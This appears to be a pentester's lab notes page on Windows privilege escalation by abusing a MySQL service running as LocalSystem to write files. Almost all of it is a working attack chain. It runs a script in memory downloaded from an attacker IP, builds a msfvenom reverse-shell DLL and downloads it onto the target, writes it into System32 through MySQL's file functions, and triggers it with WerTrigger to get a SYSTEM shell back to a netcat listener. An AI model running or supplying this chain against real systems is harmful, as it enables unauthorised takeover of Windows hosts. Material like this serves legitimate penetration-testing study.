# Write permission

### Local Enumeration

{% code overflow="wrap" %}
```bash
PS> iex (new-Object Net.WebClient).DownloadString('http://192.168.45.183/privesc/PrivescCheck.ps1');Invoke-PrivescCheck
```
{% endcode %}



<figure><img src="../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

With the MySQL service under L**ocalSystem**, you can 'write' a file to any location via MySQL!&#x20;

### Escalation

{% code overflow="wrap" %}
```bash
PS> netstat -nat  # Check SQL (3306 by default) is running  
PS> cmd /c sc qc Mysql # Validating if Mysql is running under LocalSystem 

# If this is the local
Kali> chisel server --reverse -p 9000
PS> .\cl64.exe client 192.168.45.183:1234 R:3306:127.0.0.1:3306 

# WerTrigger 
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---privileged-file-write
# https://github.com/sailay1996/WerTrigger 

git clone https://github.com/sailay1996/WerTrigger 

# Use the shell below for phoneinfo.dll 
msfvenom --platform windows --arch x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.183  LPORT=1234 -f dll -o phoneinfo.dll

# Transfer files 
# Place Report.wer and WerTrigger.exe at the same directory
PS> wget http://192.168.45.183/WerTrigger.exe -o WerTrigger.exe
PS> wget http://192.168.45.183/Report.wer -o Report.wer
PS> wget http://192.168.45.183/phoneinfo.dll -o phoneinfo.dll


# Connect to the MySQL from Kali
Kali> mysql -h 127.0.0.1 -u root -p   # with password or maybe not required 

# Database connection
# MariaDB [(none)]> select load_file('C:\\\\Users\\Administrator\\Desktop\\proof.txt');

MariaDB [(none)]> select load_file('C:\\\\xampp\\htdocs\\phoneinfo.dll') into dumpfile 'C:\\\\Windows\\system32\\phoneinfo.dll';

PS> dir \windows\system32\phoneinfo.dll
Kali> rlwrap nc -nlvp 1234 
PS> .\WerTrigger.exe
```
{% endcode %}
